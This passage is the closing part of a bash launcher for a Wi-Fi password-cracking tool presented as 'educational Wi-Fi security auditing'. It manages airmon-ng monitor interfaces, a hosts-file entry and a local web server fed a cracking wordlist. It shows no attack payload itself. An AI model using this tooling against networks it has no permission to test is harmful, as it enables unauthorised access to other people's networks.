  fi
  UI_HOST="$HOSTNAME_LOCAL"
}

teardown_dns() {
  [[ "$MANAGE_DNS" == "1" ]] || return 0
  [[ -w "$HOSTS_FILE" ]] || return 0
  if grep -q "$HOSTS_MARKER" "$HOSTS_FILE" 2>/dev/null; then
    local tmp; tmp="$(mktemp)"
    grep -v "$HOSTS_MARKER" "$HOSTS_FILE" > "$tmp" && cat "$tmp" > "$HOSTS_FILE"
    rm -f "$tmp"
    ok "Removed ${HOSTNAME_LOCAL} from ${HOSTS_FILE}."
  fi
}

cleanup() {
  local code=$?
  echo
  step "Cleaning up"
  if [[ -n "$SERVER_PID" ]] && kill -0 "$SERVER_PID" 2>/dev/null; then
    kill "$SERVER_PID" 2>/dev/null || true
    wait "$SERVER_PID" 2>/dev/null || true
    ok "Stopped web server."
  fi
  teardown_dns
  if [[ "$MODE" == "real" ]] && have airmon-ng; then
    for i in $(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -E 'mon$' || true); do
      airmon-ng stop "$i" >/dev/null 2>&1 || true
      ok "Disabled monitor interface $i."
    done
  fi
  [[ -n "$BUNDLE" && -d "$BUNDLE" ]] && rm -rf "$BUNDLE" 2>/dev/null || true
  ok "Done. Stay legal."
  exit "$code"
}
trap cleanup EXIT INT TERM

find_python() {
  for p in python3 python; do have "$p" && { echo "$p"; return; }; done
  err "Python 3 is required. Install: sudo apt install -y python3"
  exit 1
}

start_server() {
  local py; py="$(find_python)"
  step "Starting web interface"
  log "mode=${MODE} host=${BIND_HOST} port=${PORT}"

  CRACK_MODE="$MODE" \
  CRACK_WORDLIST="$WORDLIST_DEFAULT" \
  CRACK_WEBROOT="${BUNDLE}/web" \
  "$py" "${BUNDLE}/server/server.py" --host "$BIND_HOST" --port "$PORT" &
  SERVER_PID=$!

  local tries=0
  until "$py" - "$BIND_HOST" "$PORT" <<'PYEOF' 2>/dev/null
import socket, sys
s = socket.socket(); s.settimeout(0.5)
try:
    s.connect((sys.argv[1], int(sys.argv[2]))); sys.exit(0)
except Exception:
    sys.exit(1)
PYEOF
  do
    tries=$((tries+1))
    kill -0 "$SERVER_PID" 2>/dev/null || { err "Web server failed to start."; exit 1; }
    [[ $tries -gt 40 ]] && { err "Timed out waiting for web server."; exit 1; }
    sleep 0.25
  done
  ok "Web server is up (pid ${SERVER_PID})."
}

open_browser() {
  [[ "$OPEN_BROWSER" == "1" ]] || return 0
  local url="http://${UI_HOST}:${PORT}"
  local opener=""
  for o in xdg-open sensible-browser x-www-browser firefox firefox-esr chromium google-chrome open; do
    have "$o" && { opener="$o"; break; }
  done
  if [[ -n "$opener" ]]; then
    log "Opening your browser (${opener})..."
    ( "$opener" "$url" >/dev/null 2>&1 & )
  else
    warn "No browser found — open the link below manually."
  fi
}

printf '%s\n' "${C_BOLD}${C_CYA}crack-wifi${C_RESET} ${C_DIM}— educational Wi-Fi security auditing${C_RESET}"
authorize
step "Preparing"
extract_bundle
step "Detecting environment"
maybe_setup
detect_mode
setup_dns
start_server
open_browser

URL="http://${UI_HOST}:${PORT}"
printf '\n%s\n' "${C_GRN}${C_BOLD}  Open the interface:  ${URL}${C_RESET}"
printf '%s\n\n' "${C_DIM}  (Press Ctrl+C to stop and clean up.)${C_RESET}"

wait "$SERVER_PID"
